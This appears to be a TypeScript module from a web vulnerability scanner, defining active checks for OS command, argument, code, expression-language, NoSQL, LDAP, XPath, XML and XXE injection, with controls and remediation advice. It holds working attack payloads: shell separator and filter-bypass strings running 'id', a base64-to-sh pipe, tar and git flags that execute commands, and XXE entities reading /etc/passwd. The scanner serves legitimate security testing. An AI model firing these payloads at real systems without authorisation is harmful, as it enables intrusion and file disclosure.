import type { CheckOutput, Exchange, ScanCheck, ScanCheckContext } from "./types";
import { compareResponses } from "../response-diff";
import { mutateParameter, parameterValue } from "./parameters";
import { observation, ok as validExchange, result, text } from "./extended-checks";

const ok = (x: Exchange) => validExchange(x) && text(x).length <= 256000;
const success = (x: Exchange) => ok(x) && x.response!.status >= 200 && x.response!.status < 300;
const ready = (ctx: ScanCheckContext) =>
  !!ctx.parameter && ctx.stable && ctx.baselines.length >= 2 && ctx.baselines.every(success);
function restored(ctx: ScanCheckContext, x: Exchange) {
  if (!success(x)) return false;
  const diff = compareResponses(ctx.baselines[0]!.response!, x.response!, ctx.diffOptions);
  return !diff.statusChanged && !diff.bodyChanged;
}
const rawXml = (ctx: ScanCheckContext) =>
  !ctx.parameter &&
  /^(?:application|text)\/(?:[a-z0-9.+-]+\+)?xml(?:\s*;|$)/i.test(
    Object.entries(ctx.request.headers).find(
      ([key]) => key.toLowerCase() === "content-type",
    )?.[1] ?? "",
  ) &&
  ctx.request.body.trimStart().startsWith("<");
const xmlReady = (ctx: ScanCheckContext) =>
  ready(ctx) ||
  (rawXml(ctx) && ctx.stable && ctx.baselines.length >= 2 && ctx.baselines.every(success));
const send = (ctx: ScanCheckContext, payload: string, label: string) =>
  ctx.probe(
    ctx.parameter
      ? mutateParameter(ctx.request, ctx.parameter, payload)
      : { ...ctx.request, headers: { ...ctx.request.headers }, body: payload },
    label,
  );
const contains = (x: Exchange, marker: string) => text(x).slice(0, 256000).includes(marker);
function evidence(
  title: string,
  summary: string,
  rows: Exchange[],
  excerpts: string[],
  severity: "low" | "medium" | "high",
  remediation: string,
): CheckOutput {
  const output = observation(title, summary, rows, excerpts, severity);
  output.findings[0]!.remediation = remediation;
  return output;
}

export const commandInjection: ScanCheck = {
  id: "command-injection",
  name: "OS command injection — split output markers (POSIX)",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ready(ctx))
      return result("Stable successful baselines and a selected parameter required.", true);
    for (const style of ["separator", "substitution"] as const) {
      const rows: Exchange[] = [];
      const markers: string[] = [];
      for (let i = 0; i < 2; i++) {
        const nonce = ctx
          .nonce()
          .replace(/[^a-zA-Z0-9]/g, "")
          .slice(0, 40);
        const left = `slurp${nonce}`,
          right = `proof${i}`;
        const command = `printf '%s%s' '${left}' '${right}'`;
        const payload = style === "separator" ? `;${command};#` : `$(${command})`;
        const marker = left + right;
        if (ctx.baselines.some((x) => contains(x, marker)))
          return result("Generated output marker already present in baseline.", true);
        const control = await send(ctx, `slurp-control-${nonce}`, "Command plain-text control");
        const probe = await send(ctx, payload, `Command split marker ${i + 1} (${style})`);
        rows.push(control, probe);
        markers.push(marker);
        if (!success(control) || !success(probe))
          return result("Command probes failed or were blocked.", true);
        if (contains(control, marker) || !contains(probe, marker)) break;
      }
      if (
        rows.length === 4 &&
        markers.every(
          (marker, i) => contains(rows[i * 2 + 1]!, marker) && !contains(rows[i * 2]!, marker),
        )
      ) {
        const original = await ctx.probe(ctx.request, "Command original control");
        if (!restored(ctx, original))
          return result("Original response did not restore baseline.", true);
        return evidence(
          "Possible OS command injection: constructed output observed",
          "Two independently constructed POSIX printf markers appeared only in command probes. Markers are absent from the literal payload and plain controls. This supports command interpretation; application transformations still require review. No file writes, sleeps or external callbacks are used.",
          [...ctx.baselines, ...rows, original],
          [`POSIX ${style}; two split output markers`],
          "high",
          "Avoid shell invocation; pass validated arguments directly to a fixed executable.",
        );
      }
    }
    return result(
      "No constructed output for supported POSIX shell contexts; blind and Windows execution are not assessed.",
    );
  },
};

function arithmeticCheck(
  id: "code-injection" | "el-injection",
  name: string,
  formats: {
    name: string;
    probe: (a: number, b: number) => string;
    control: (a: number, b: number) => string;
  }[],
): ScanCheck {
  return {
    id,
    name,
    active: true,
    perParameter: true,
    async run(ctx) {
      if (!ready(ctx))
        return result("Stable successful baselines and a selected parameter required.", true);
      for (const format of formats) {
        const rows: Exchange[] = [];
        const products: string[] = [];
        // Nonce-derived operands prevent fixed reflected examples from satisfying both probes.
        const seed = [...ctx.nonce()].reduce((n, c) => (n * 31 + c.charCodeAt(0)) % 997, 0);
        for (let i = 0; i < 2; i++) {
          const a = 1013 + seed + i * 42,
            b = 2111 + i * 68;
          const product = String(a * b),
            payload = format.probe(a, b);
          const token = (x: Exchange) =>
            new RegExp(`(^|[^0-9])${product}([^0-9]|$)`).test(text(x).slice(0, 256000));
          if (payload.includes(product) || ctx.baselines.some(token))
            return result("Arithmetic output already present in baseline or payload.", true);
          const control = await send(
            ctx,
            format.control(a, b),
            `${format.name} non-evaluating control`,
          );
          const probe = await send(ctx, payload, `${format.name} arithmetic ${i + 1}`);
          rows.push(control, probe);
          products.push(product);
          if (!ok(control) || !success(probe))
            return result("Arithmetic probes failed or were blocked.", true);
          if (token(control) || !token(probe)) break;
        }
        if (
          rows.length === 4 &&
          products.every((product, i) => {
            const token = new RegExp(`(^|[^0-9])${product}([^0-9]|$)`);
            return (
              token.test(text(rows[i * 2 + 1]!).slice(0, 256000)) &&
              !token.test(text(rows[i * 2]!).slice(0, 256000))
            );
          })
        ) {
          const original = await ctx.probe(ctx.request, `${format.name} original control`);
          if (!restored(ctx, original))
            return result("Original response did not restore baseline.", true);
          return evidence(
            `Possible ${id === "el-injection" ? "expression language" : "server-side code"} injection: arithmetic evaluation`,
            `Two independent products were observed only for ${format.name} expressions, with negative and restored-original controls. A deliberate calculator or template feature can produce the same behavior; arbitrary code execution and a specific runtime are not proven.`,
            [...ctx.baselines, ...rows, original],
            [
              `Syntax family: ${format.name}`,
              "Two products absent from literal payloads and non-evaluating controls",
            ],
            "medium",
            "Keep untrusted input out of evaluators; use a restricted data parser and explicit allowlists.",
          );
        }
      }
      return result("No controlled arithmetic evaluation for supported expression contexts.");
    },
  };
}
export const codeInjection = arithmeticCheck(
  "code-injection",
  "Server-side code injection — arithmetic controls",
  [
    {
      name: "Python-like print",
      probe: (a, b) => `print(${a}*${b})`,
      control: (a, b) => `print('${a}*${b}')`,
    },
    {
      name: "PHP-like echo",
      probe: (a, b) => `echo ${a}*${b};`,
      control: (a, b) => `echo '${a}*${b}';`,
    },
    {
      name: "JavaScript-like String",
      probe: (a, b) => `String(${a}*${b})`,
      control: (a, b) => `String('${a}*${b}')`,
    },
  ],
);
export const elInjection = arithmeticCheck(
  "el-injection",
  "Expression language injection — arithmetic controls",
  [
    {
      name: "Dollar expression",
      probe: (a, b) => `\${${a}*${b}}`,
      control: (a, b) => `\${'${a}*${b}'}`,
    },
    {
      name: "Hash expression",
      probe: (a, b) => `#{${a}*${b}}`,
      control: (a, b) => `#{'${a}*${b}'}`,
    },
  ],
);

function parserCheck(
  id: "ldap-injection" | "xpath-injection" | "xml-injection" | "nosql-injection",
  name: string,
  payload: string,
  signature: RegExp,
  context: string,
): ScanCheck {
  return {
    id,
    name,
    active: true,
    perParameter: true,
    async run(ctx) {
      if (!(id === "xml-injection" ? xmlReady(ctx) : ready(ctx)))
        return result(
          "Stable successful baselines and a selected parameter or XML request body required.",
          true,
        );
      if (ctx.baselines.some((x) => signature.test(text(x).slice(0, 256000))))
        return result(
          "Parser signature already present in baseline; differential attribution unavailable.",
          true,
        );
      const control = await send(ctx, `slurp-control-${ctx.nonce()}`, `${context} benign control`);
      const first = await send(ctx, payload, `${context} malformed syntax`);
      const second = await send(ctx, payload, `${context} malformed syntax repeat`);
      const original = await ctx.probe(ctx.request, `${context} original control`);
      const rows = [control, first, second, original];
      if (
        !rows.every(ok) ||
        [first, second].some((x) => [401, 403, 429].includes(x.response!.status))
      )
        return result("Parser probes unavailable, truncated or blocked.", true);
      if (
        !restored(ctx, original) ||
        !success(control) ||
        signature.test(text(control).slice(0, 256000))
      )
        return result("Parser controls did not isolate the syntax error.", true);
      if ([first, second].every((x) => signature.test(text(x).slice(0, 256000))))
        return evidence(
          `Possible ${context} injection: repeated parser error differential`,
          `Malformed input repeatedly produced a ${context}-specific parser signature absent from successful baselines, benign and original controls. This establishes a parser-error differential, not data access or authentication bypass.`,
          [...ctx.baselines, ...rows],
          [`${context} parser signature observed twice; response contents omitted`],
          "low",
          "Use parameterized queries or structured builders; reject invalid data and avoid returning parser errors.",
        );
      return result(`No repeated ${context}-specific parser error differential.`);
    },
  };
}
export const nosqlInjection = parserCheck(
  "nosql-injection",
  "NoSQL injection — parser error differential",
  "'\";{[$slurp]}",
  /(?:Mongo(?:Server|Error|ParseError|QueryException)|BSON(?:Error|TypeError)|unknown (?:top level )?operator:\s*\$|(?:invalid|malformed) BSON|CouchbaseException|com\.mongodb\.(?:Mongo|Query))/i,
  "NoSQL",
);
export const ldapInjection = parserCheck(
  "ldap-injection",
  "LDAP injection — parser error differential",
  "*)(slurp'\\",
  /(?:LDAPException|LDAPFilterException|javax\.naming\.(?:directory\.)?(?:InvalidSearchFilter|Naming)Exception|Bad search filter|LDAP: error code (?:2|21|87)\b|invalid LDAP (?:search )?filter)/i,
  "LDAP",
);
export const xpathInjection = parserCheck(
  "xpath-injection",
  "XPath injection — parser error differential",
  "'\"][slurp(",
  /(?:XPath(?:Expression)?Exception|XPathEvalError|Invalid XPath|invalid predicate|javax\.xml\.xpath|System\.Xml\.XPath\.XPathException)/i,
  "XPath",
);
export const xmlInjection = parserCheck(
  "xml-injection",
  "XML injection — parser error differential",
  '<slurp attr="unterminated>&',
  /(?:SAXParseException|XMLSyntaxError|System\.Xml\.XmlException|org\.xml\.sax|XML (?:parsing|parse) error|not well-formed \(invalid token\))/i,
  "XML",
);

export const xmlEntity: ScanCheck = {
  id: "xml-entity",
  name: "XML internal entity processing — split markers",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!xmlReady(ctx))
      return result(
        "Stable successful baselines and an XML-bearing selected parameter or XML body required.",
        true,
      );
    const rows: Exchange[] = [];
    for (let i = 0; i < 2; i++) {
      const nonce = ctx
          .nonce()
          .replace(/[^a-zA-Z0-9]/g, "")
          .slice(0, 40),
        left = `slurp${nonce}`,
        right = `entity${i}`,
        marker = left + right;
      if (ctx.baselines.some((x) => contains(x, marker)))
        return result("Entity marker already in baseline.", true);
      const prefix = `<!DOCTYPE slurp [<!ENTITY a "${left}"><!ENTITY b "${right}">]>`;
      const control = await send(
        ctx,
        `${prefix}<slurp>&amp;a;&amp;b;</slurp>`,
        "XML escaped-entity control",
      );
      const probe = await send(
        ctx,
        `${prefix}<slurp>&a;&b;</slurp>`,
        `XML internal entity ${i + 1}`,
      );
      rows.push(control, probe);
      if (!success(control) || !success(probe))
        return result("XML entity probes unavailable or rejected.", true);
      if (contains(control, marker) || !contains(probe, marker))
        return result("No controlled internal entity expansion.");
    }
    const original = await ctx.probe(ctx.request, "XML entity original control");
    if (!restored(ctx, original))
      return result("Original response did not restore baseline.", true);
    return evidence(
      "XML internal entity expansion observed",
      "Two split internal entity markers were expanded only in entity probes. Internal entity support alone does not establish XXE, external file access or entity-expansion denial of service. No recursive entities or external resources were used.",
      [...ctx.baselines, ...rows, original],
      ["Two bounded internal entities per document; escaped-entity negative controls"],
      "low",
      "Disable DTD processing when unnecessary; disable external entity resolution independently.",
    );
  },
};

export const xxe: ScanCheck = {
  id: "xxe",
  name: "XXE — local file entity controls",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!xmlReady(ctx))
      return result(
        "Stable successful baselines and an XML-bearing selected parameter or XML body required.",
        true,
      );
    const cases = [
      {
        uri: "file:///etc/passwd",
        signature: /(?:^|\n)root:[^:\r\n]*:0:0:[^\r\n]*:[^:\r\n]*:[^\r\n]+/,
      },
      {
        uri: "file:///C:/Windows/win.ini",
        signature: /\[fonts\][\s\S]{0,4096}\[(?:extensions|mci extensions)\]/i,
      },
      {
        uri: "http://example.com/",
        signature: /Example Domain/i,
      },
    ];
    for (const candidate of cases) {
      if (ctx.baselines.some((x) => candidate.signature.test(text(x).slice(0, 256000)))) continue;
      const nonce = ctx
        .nonce()
        .replace(/[^a-zA-Z0-9]/g, "")
        .slice(0, 40);
      const document = (uri: string, escaped: boolean) =>
        `<!DOCTYPE slurp [<!ENTITY slurpfile SYSTEM "${uri}">]><slurp>${escaped ? "&amp;slurpfile;" : "&slurpfile;"}</slurp>`;
      const escaped = await send(ctx, document(candidate.uri, true), "XXE escaped-entity control");
      const missing = await send(
        ctx,
        document(`file:///slurp-missing-${nonce}`, false),
        "XXE missing-file control",
      );
      const first = await send(ctx, document(candidate.uri, false), "XXE local-file entity");
      const second = await send(
        ctx,
        document(candidate.uri, false),
        "XXE local-file entity repeat",
      );
      const original = await ctx.probe(ctx.request, "XXE original control");
      const rows = [escaped, missing, first, second, original];
      if (!rows.every(ok)) return result("XXE evidence unavailable or truncated.", true);
      const matches = (x: Exchange) => candidate.signature.test(text(x).slice(0, 256000));
      if (
        success(escaped) &&
        restored(ctx, original) &&
        !matches(escaped) &&
        !matches(missing) &&
        [first, second].every((x) => success(x) && matches(x))
      ) {
        const label = candidate.uri.startsWith("http")
          ? "remote HTTP entity"
          : "local-file";
        return evidence(
          `Possible XXE: repeated ${candidate.uri.startsWith("http") ? "remote" : "local-file"} content signature`,
          `Two external entity probes returned a known ${label} signature absent from baselines, escaped-entity, missing-file and restored-original controls. File and network signatures require contextual review; no callback, recursive expansion or file write was attempted. Cloud metadata targets are intentionally not requested automatically because the response could contain credentials.`,
          [...ctx.baselines, ...rows],
          [
            `Entity target: ${candidate.uri}`,
            "Repeated file/remote signature; returned content omitted from excerpts",
          ],
          "high",
          "Disable DTDs and external entity resolution in the XML parser; prohibit file and network resolvers, and require IMDSv2 where applicable.",
        );
      }
    }
    return result(
      "No controlled local-file or remote HTTP entity signature; cloud metadata, blind XXE, remote callbacks and other XML input locations are not requested automatically.",
    );
  },
};
const BENIGN_UID = /(?:^|\n)uid=\d+\([^)]*\) gid=\d+\(/;
function commandPayload(ctx: ScanCheckContext) {
  return parameterValue(ctx.request, ctx.parameter!);
}

export const commandBypass: ScanCheck = {
  id: "command-bypass",
  name: "OS command injection — separator and filter bypass",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ready(ctx)) return result("Stable successful baselines and a selected parameter required.", true);
    if (ctx.baselines.some((x) => BENIGN_UID.test(text(x))))
      return result("Baseline already contains command-output signatures.", true);
    const control = await send(ctx, `slurp_${ctx.nonce().replace(/[^a-zA-Z0-9]/g, "")}`, "Command bypass plain control");
    if (!success(control) || BENIGN_UID.test(text(control)))
      return result("Command bypass control failed or contains command output.", true);
    const payloads = [
      [";id", "semicolon"],
      ["|id", "pipe"],
      ["||id", "OR pipe"],
      ["&id", "background"],
      ["&&id", "AND"],
      ["`id`", "backtick"],
      ["$(id)", "substitution"],
      ["\nid", "newline"],
      ["\nid\n", "padded newline"],
      ["%0aid", "double-decoded newline"],
      [";${IFS}id", "IFS"],
      [";\tid", "tab"],
      [";i$()d", "split command"],
      [";i'd'", "quoted split"],
      [";$IFS$9id", "IFS with positional"],
      [";echo aWQ=|base64 -d|sh", "base64 pipe"],
    ] as const;
    for (const [payload, label] of payloads) {
      const probe = await send(ctx, payload, `Command bypass ${label}`);
      const repeat = await send(ctx, payload, `Command bypass ${label} repeat`);
      if (!success(probe) || !success(repeat))
        return result("Command bypass probes failed or were blocked.", true);
      if (BENIGN_UID.test(text(probe)) && BENIGN_UID.test(text(repeat))) {
        const original = await ctx.probe(ctx.request, "Command bypass original control");
        if (!restored(ctx, original)) return result("Original response did not restore baseline.", true);
        return evidence(
          `Possible OS command injection via ${label} separator/filter bypass`,
          "A benign `id` payload returned uid/gid output twice while a plain control did not. This indicates shell interpretation despite the separator or filter evasions; only `id` was executed and no file read, callback or data change was performed.",
          [...ctx.baselines, control, probe, repeat, original],
          [`Payload: ${payload}`, "uid/gid output reproduced twice"],
          "high",
          "Avoid shell interpolation: use argument arrays, allowlist inputs and run commands with least privilege.",
        );
      }
    }
    return result("No uid/gid command output observed for the supported separator and filter evasions.");
  },
};

export const argumentInjection: ScanCheck = {
  id: "argument-injection",
  name: "OS argument injection — benign execution flags",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ready(ctx)) return result("Stable successful baselines and a selected parameter required.", true);
    const original = commandPayload(ctx);
    if (ctx.baselines.some((x) => BENIGN_UID.test(text(x))))
      return result("Baseline already contains command-output signatures.", true);
    const control = await send(ctx, original || "slurp", "Argument plain control");
    if (!success(control) || BENIGN_UID.test(text(control)))
      return result("Argument control failed or contains command output.", true);
    const flags = [
      ["--upload-pack=id", "git upload-pack"],
      ["--checkpoint-action=exec=id", "tar checkpoint action"],
      ["--use-compress-program=id", "tar compress program"],
      ["ext::id", "git ext remote"],
    ] as const;
    for (const [flag, label] of flags) {
      const payload = original ? `${original} ${flag}` : flag;
      const probe = await send(ctx, payload, `Argument injection ${label}`);
      const repeat = await send(ctx, payload, `Argument injection ${label} repeat`);
      if (!success(probe) || !success(repeat))
        return result("Argument injection probes failed or were blocked.", true);
      if (BENIGN_UID.test(text(probe)) && BENIGN_UID.test(text(repeat))) {
        const restore = await ctx.probe(ctx.request, "Argument injection original control");
        if (!restored(ctx, restore)) return result("Original response did not restore baseline.", true);
        return evidence(
          `Possible argument injection: ${label}`,
          "A benign execution flag returned uid/gid output twice while the original value did not. This indicates the input reaches a tool argument parser and can introduce new flags; only `id` was executed and no file write, callback or data change was performed.",
          [...ctx.baselines, control, probe, repeat, restore],
          [`Payload: ${payload}`, "uid/gid output reproduced twice"],
          "high",
          "Pass user input as a single validated argument (or use `--`), reject leading flags and avoid shell command construction.",
        );
      }
    }
    return result("No uid/gid output observed for the supported argument-injection flags.");
  },
};

export const injectionChecks: readonly ScanCheck[] = [
  nosqlInjection,
  commandInjection,
  commandBypass,
  argumentInjection,
  codeInjection,
  elInjection,
  ldapInjection,
  xpathInjection,
  xmlInjection,
  xmlEntity,
  xxe,
  {
    ...xmlInjection,
    id: "xml-injection-body",
    name: "XML body — parser error differential",
    perParameter: false,
  },
  {
    ...xmlEntity,
    id: "xml-entity-body",
    name: "XML body — internal entity processing",
    perParameter: false,
  },
  {
    ...xxe,
    id: "xxe-body",
    name: "XML body — XXE local-file entity controls",
    perParameter: false,
  },
];
